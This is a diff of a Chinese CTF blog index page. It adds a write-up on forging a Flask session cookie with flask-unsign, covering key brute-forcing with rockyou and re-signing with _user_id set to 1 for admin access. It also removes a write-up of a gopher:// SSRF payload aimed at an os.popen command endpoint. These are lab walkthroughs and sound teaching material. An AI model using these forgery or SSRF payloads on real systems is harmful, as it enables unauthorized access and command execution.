@@ -2255,6 +2255,8 @@
       
         
       
+        
+      
     
     
     
@@ -2972,6 +2974,36 @@
   
   
     <li class="md-nav__item">
+      <a href="category/%E4%BC%9A%E8%AF%9D%E4%BC%AA%E9%80%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    会话伪造
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="category/%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-nav__link">
         
   
@@ -3594,6 +3626,159 @@
 </span></code></pre></div>
 <p>重点不是"这题用了什么 payload"，而是<strong>"我是怎么判断出该用这个的"</strong>。</p>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-21 20:45:00+00:00">2026-11-21</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/web/" class="md-meta__link">Web</a>, 
+              <a href="category/%E4%BC%9A%E8%AF%9D%E4%BC%AA%E9%80%A0/" class="md-meta__link">会话伪造</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="nssround13-basic-flaskjwt"><a class="toclink" href="nssround13-flask-jwt/">[NSSRound#13 Basic] flask?jwt? — 先分清它是谁</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Flask session 伪造（签名密钥泄露）</p>
+<p><strong>Flag</strong>：<code>NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="nssround13-flask-jwt/#_1">题目概述</a></h3>
+<p><strong>题名本身就是提示：<code>flask?jwt?</code>——它在问你，这个 session 到底是 Flask 的还是 JWT 的。</strong></p>
+<p><strong>这两者长得像（都是一串点分段的 base64），但</strong>处理方式完全不同<strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>JWT             三段，第一段是 {"alg":"HS256",...}
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Flask session   三段或四段，解出来是 {"_fresh":true,...}
+</span></code></pre></div>
+<p><strong>先分辨清楚，再决定用哪套工具——这一步能省掉大量瞎试。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="nssround13-flask-jwt/#_2">解题过程</a></h3>
+<h4 id="step-1-session"><a class="toclink" href="nssround13-flask-jwt/#step-1-session">Step 1：注册个账号，看 session</a></h4>
+<p><strong>随便注册、登录，抓包看 cookie：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>session=eyJfZnJlc2giOnRydWUs...
+</span></code></pre></div>
+<p><strong>它是三段式，而且解出来是 Python 字典的键名（<code>_fresh</code>、<code>_user_id</code>）——这是 Flask 的 session，不是 JWT。</strong></p>
+<p><strong>用 flask-unsign 解：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span>
+</span></code></pre></div>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">{</span><span class="s1">'_fresh'</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a> <span class="s1">'_id'</span><span class="p">:</span> <span class="s1">'ae8e9db8fb729eeafed37232050214fccc9622e0659ecd9f43975a2a49ca9e26c0f81ca580bf3fe07a890e68021b5b54fffe0e2bc8cb86a30e503a402acbbd02'</span><span class="p">,</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a> <span class="s1">'_user_id'</span><span class="p">:</span> <span class="s1">'2'</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>三个键：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>_fresh    这次是不是刚登录的
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>_id       会话 id（Flask-Login 用来绑定会话）
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>_user_id  当前用户编号 ← 要改的就是它
+</span></code></pre></div>
+<h4 id="step-2-flag-admin"><a class="toclink" href="nssround13-flask-jwt/#step-2-flag-admin">Step 2：点“获取 flag”，提示不是 admin</a></h4>
+<p><strong>说明后端在判断 <code>_user_id</code> 是不是 1。</strong></p>
+<p><strong>那就把 <code>'2'</code> 改成 <code>'1'</code>。</strong></p>
+<h4 id="step-3"><a class="toclink" href="nssround13-flask-jwt/#step-3">Step 3：直接改值没用——它是签名过的</a></h4>
+<p><strong>Flask 的 session 是</strong>签名 cookie<strong>：内容放在客户端，但签名在服务端校验。</strong></p>
+<p><strong>改了内容、签名对不上，服务端直接丢弃整个 session，表现得像“你没登录”。</strong></p>
+<p><strong>所以必须</strong>重新签名<strong>，而这需要 <code>SECRET_KEY</code>。</strong></p>
+<h4 id="step-4"><a class="toclink" href="nssround13-flask-jwt/#step-4">Step 4：一边爆破，一边找提示</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">flask</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-no-literal-eval</span>
+</span></code></pre></div>
+<p><strong><code>--no-literal-eval</code> 是必须的</strong>：rockyou 里有纯数字行（比如 <code>123456</code>），默认会被当 Python 字面量解析成整数，然后报 <code>Secret must be a string</code>，爆破直接中断。</p>
+<p><strong>注意这一步是</strong>并行<strong>的——爆破同时去翻页面。</strong></p>
+<p><strong>在“忘记密码”页面的 HTML 源码末尾，看到一行注释：</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cm">&lt;!-- secretkey: th3flaskisfunny --&gt;</span>
+</span></code></pre></div>
+<p><strong>密钥直接写在页面注释里。</strong></p>
+<p><strong><code>Ctrl + C</code> 停掉爆破——不用等了。</strong></p>
+<h4 id="step-5"><a class="toclink" href="nssround13-flask-jwt/#step-5">Step 5：用密钥重签</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'_fresh':True,'_id':'ae8e9db8...503a402acbbd02','_user_id':'1'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="s2">"th3flaskisfunny"</span>
+</span></code></pre></div>
+<p><strong>三个必须注意的：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>① 整个字典都要写，不能只写 _user_id
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>   _fresh 和 _id 缺了，Flask-Login 认为会话不完整，直接不认
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>② 值保持字符串：'1' 而不是 1
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>③ PowerShell 里用双引号包整块，里面用单引号
+</span></code></pre></div>
+<p><strong>把输出的值替换 cookie，刷新页面再点一次“获取 flag”：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>判断类型</td>
+<td>解第一段：<code>{"alg":...}</code> 是 JWT，<code>{"_fresh":...}</code> 是 Flask</td>
+</tr>
+<tr>
+<td>Flask session</td>
+<td>内容在客户端，签名在服务端，改值必须重签</td>
+</tr>
+<tr>
+<td>三个键</td>
+<td><code>_fresh</code> / <code>_id</code> / <code>_user_id</code>，重签时一个都不能少</td>
+</tr>
+<tr>
+<td>爆破参数</td>
+<td><code>--no-literal-eval</code>（否则数字行会中断爆破）</td>
+</tr>
+<tr>
+<td>密钥来源</td>
+<td>页面 HTML 注释：<code>&lt;!-- secretkey: th3flaskisfunny --&gt;</code></td>
+</tr>
+<tr>
+<td>提权动作</td>
+<td><code>_user_id</code> 从 2 改成 1</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整流程</summary>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># ① 解码</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># ② 爆破（可被下面的源码提示中断）</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">flask</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-no-literal-eval</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="c"># ③ 用泄露的密钥重签</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'_fresh':True,'_id':'ae8e...','_user_id':'1'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="s2">"th3flaskisfunny"</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 把 Flask session 当 JWT 打</strong></p>
+<p><strong>jwt_tool 会直接报 <code>Not 3 parts</code>（四段）或解析出一堆 <code>_fresh</code> 之类的键。</strong>两个工具不通用，先判断再选。</p>
+<p><strong>② 在 rockyou 上干等</strong></p>
+<p>1400 万行要跑很久。<strong><code>--no-literal-eval</code> 不加还会直接崩。</strong>正确做法是<strong>同时翻页面</strong>——这题的密钥就在注释里。</p>
+<p><strong>③ 只写 <code>_user_id</code> 去签名</strong></p>
+<p>Flask-Login 需要 <code>_fresh</code> 和 <code>_id</code>，缺一个就判会话无效。<strong>重签是“整块重写”，不是“打补丁”。</strong></p>
+<p><strong>④ 写成 <code>1</code> 而不是 <code>'1'</code></strong></p>
+<p>类型不一致，比较可能失败。<strong>原来是什么类型就保持什么类型。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5172,227 +5357,6 @@
 <p><code>str({'history': [], 'money': 999999})</code> 和 <code>str({'money': 999999, 'history': []})</code> 是两个不同的字符串。<strong>键的插入顺序必须和服务器一致。</strong></p>
 <p><strong>④ 以为 pickle RCE 这条路能直接拿 flag</strong></p>
 <p>代码执行确实成立（sleep 5 有效），但 flag 不在磁盘上随便一个位置——它要靠“买”这个业务动作才会显示。<strong>所以还是得回到签名伪造。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-11 21:00:00+00:00">2026-11-11</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/python/" class="md-meta__link">Python</a>, 
-              <a href="category/ssrf/" class="md-meta__link">SSRF</a>, 
-              <a href="category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="ghctf-2025-goph3rrr-gopher-post"><a class="toclink" href="ghctf2025-goph3rrr/">[GHCTF 2025] Goph3rrr — 用 gopher 让服务器给自己发一条 POST</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Python 代码审计 — curl SSRF + gopher 协议构造任意 TCP 报文</p>
-<p><strong>Flag</strong>：<code>NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="ghctf2025-goph3rrr/#_1">题目概述</a></h3>
-<p>进靶场没有任何有用信息，页面源码也是空的。<strong>那就扫目录。</strong></p>
-<p>扫出来 <code>app.py</code>，拿源码审计。</p>
-<hr />
-<h3 id="_2"><a class="toclink" href="ghctf2025-goph3rrr/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="ghctf2025-goph3rrr/#step-1">Step 1：先排除干扰路由</a></h4>
-<p>源码里一堆路由，其中这三个是摆设：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">/</span><span class="n">Login</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">/</span><span class="n">Register</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="o">/</span><span class="n">Upload</span>
-</span></code></pre></div>
-<p><strong>旁边还标着 <code>junkcode</code>——作者明说了是混淆视听用的，直接跳过，一个都别管。</strong></p>
-<p><strong>真正有用的只有两个：<code>/Gopher</code> 和 <code>/Manage</code>。</strong></p>
-<h4 id="step-2manage-rce"><a class="toclink" href="ghctf2025-goph3rrr/#step-2manage-rce">Step 2：<code>/Manage</code> 是 RCE 点</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/Manage'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">cmd</span><span class="p">():</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="p">:</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>        <span class="k">return</span> <span class="s2">"Forbidden!!!"</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"GET"</span><span class="p">:</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>        <span class="k">return</span> <span class="s2">"Allowed!!!"</span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">:</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>        <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"cmd"</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></code></pre></div>
-<p><strong>三句话读完：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>来源必须是 127.0.0.1      → 外部直连一定被拒
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>方法必须是 POST           → 路由上就写死了 methods=['POST']
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>cmd 从 form 里取          → 直接进 os.popen
-</span></code></pre></div>
-<p><strong>注意中间那个 <code>if request.method == "GET"</code> 分支是无用代码——路由只注册了 POST，GET 根本进不来（会 405）。不用管它。</strong></p>
-<p><strong>所以目标是：</strong>让服务器自己向 <code>/Manage</code> 发一条 POST，带上 <code>cmd</code><strong>。</strong></p>
-<h4 id="step-3gopher"><a class="toclink" href="ghctf2025-goph3rrr/#step-3gopher">Step 3：<code>/Gopher</code> 给了我们“发请求”的能力</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/Gopher'</span><span class="p">)</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">visit</span><span class="p">():</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span class="k">if</span> <span class="n">url</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>        <span class="k">return</span> <span class="s2">"No url provided :)"</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="n">realIpAddress</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="k">if</span> <span class="n">url</span><span class="o">.</span><span class="n">scheme</span> <span class="o">==</span> <span class="s2">"file"</span> <span class="ow">or</span> <span class="n">realIpAddress</span> <span class="ow">in</span> <span class="n">BlackList</span><span class="p">:</span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>        <span class="k">return</span> <span class="s2">"No (≧∇≦)"</span>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">"curl"</span><span class="p">,</span> <span class="s2">"-L"</span><span class="p">,</span> <span class="n">urlunparse</span><span class="p">(</span><span class="n">url</span><span class="p">)],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>    <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
-</span></code></pre></div>
-<p><strong>做的事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>① 取 url 参数
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>② 解析出 hostname，解析成 IP，判断是否在黑名单
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>③ 拦截 file:// 协议
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>④ 没过就交给 curl -L &lt;url&gt; 去请求，把输出返回
-</span></code></pre></div>
-<p><strong>这里的关键是 <code>curl</code>。</strong>curl 支持的不只是 http——<strong>它还支持 <code>gopher://</code>。</strong></p>
-<p><strong><code>gopher://host:port/_&lt;data&gt;</code> 的含义是：连到这个 host 的 port，把 <code>_</code> 后面的内容</strong>原样<strong>作为字节发过去，然后把响应读回来。</strong></p>
-<p><strong>这就是“手写任意 TCP 报文”的口子。</strong></p>
-<h4 id="step-4-0000-127001"><a class="toclink" href="ghctf2025-goph3rrr/#step-4-0000-127001">Step 4：为什么要用 <code>0.0.0.0</code> 而不是 <code>127.0.0.1</code></a></h4>
-<p><strong><code>realIpAddress in BlackList</code> 拦的是解析出来的 IP。<code>127.0.0.1</code> 这种回环地址几乎一定在黑名单里。</strong></p>
-<p><strong>而 <code>0.0.0.0</code> 在 Linux 上是“本机所有地址”，连它等于连本机，但它不在黑名单里。</strong></p>
-<p><strong>所以 host 用 <code>0.0.0.0</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gopher://0.0.0.0:8000/_...
-</span></code></pre></div>
-<p><strong>连上去之后，<code>REMOTE_ADDR</code> 就是 127.0.0.1，<code>/Manage</code> 的来源校验就过了。</strong></p>
-<h4 id="step-5"><a class="toclink" href="ghctf2025-goph3rrr/#step-5">Step 5：报文怎么写</a></h4>
-<p><strong>要发给 <code>/Manage</code> 一条 POST，报文必须是完整 HTTP：</strong></p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nf">POST</span> <span class="nn">/Manage</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8000</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">8</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nt">cmd</span><span class="o">=</span><span class="s">ls /</span>
-</span></code></pre></div>
-<p><strong>几个必须对的地方：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>① 行尾必须 \r\n（CRLF），不是 \n
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>② 头部和 body 之间必须有一个空行（\r\n\r\n）
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>③ Content-Length 必须等于 body 的字节数
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>   "cmd=ls /" 正好 8 个字节
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>④ 先 GET 的话进不去——路由只收 POST
-</span></code></pre></div>
-<p><strong>gopher 里要再做一次 URL 编码，<code>\r\n</code> 变成 <code>%0D%0A</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/
-</span></code></pre></div>
-<h4 id="step-6"><a class="toclink" href="ghctf2025-goph3rrr/#step-6">Step 6：用脚本拼，别手写</a></h4>
-<p><strong>这条串里 <code>%0D%0A</code> 出现六次，手写必错。用脚本生成：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">body</span> <span class="o">=</span> <span class="s2">"cmd=ls /"</span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">req</span> <span class="o">=</span> <span class="p">(</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    <span class="s2">"POST /Manage HTTP/1.1</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    <span class="s2">"Host: 127.0.0.1:8000</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="s2">"Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    <span class="s2">"Content-Length: </span><span class="si">%d</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    <span class="s2">"</span><span class="si">%s</span><span class="s2">"</span>
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">),</span> <span class="n">body</span><span class="p">)</span>
-</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
